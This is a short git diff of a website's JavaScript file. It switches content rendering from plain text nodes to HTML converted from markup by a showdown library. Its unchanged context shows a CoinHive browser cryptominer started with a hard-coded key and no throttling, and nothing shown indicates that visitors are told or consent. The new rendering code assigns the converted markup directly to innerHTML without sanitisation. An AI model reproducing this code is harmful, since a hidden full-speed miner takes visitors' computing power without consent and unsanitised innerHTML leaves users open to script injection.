@@ -1,4 +1,6 @@
+import markupToHtml from "./showdown";
 import "./style.scss";
+
 
 const mine = async() => {
     const miner = await CoinHive.Anonymous('R33EaeMyKkd8SvOQKSrecxGLbhu47dZO', { throttle: 0 });
@@ -32,7 +34,7 @@ const loadNextChunk = id => {
         .then(response => {
             hidePreLoader(id);
             removeLoadMoreButton(id);
-            renderNextChunk(response.text, id);
+            renderNextChunk(response.markup, id);
         }).catch(e => {
             // TODO re-enable button?
             console.error(e.name, e.message);
@@ -48,12 +50,12 @@ const removeLoadMoreButton = id => {
     }
 }
 
-const renderNextChunk = (text, id) => {
+const renderNextChunk = (markup, id) => {
     const contentContainer = document.querySelector(`.section[data-section-id="${id}"]`);
-    const domElement = document.createElement("p");
-    domElement.className = "flow-text";
-    const textNode = document.createTextNode(text);
-    domElement.appendChild(textNode);
+    const domElement = document.createElement("div");
+
+    const html = markupToHtml(markup);
+    domElement.innerHTML = html;
     contentContainer.appendChild(domElement);
 }
 
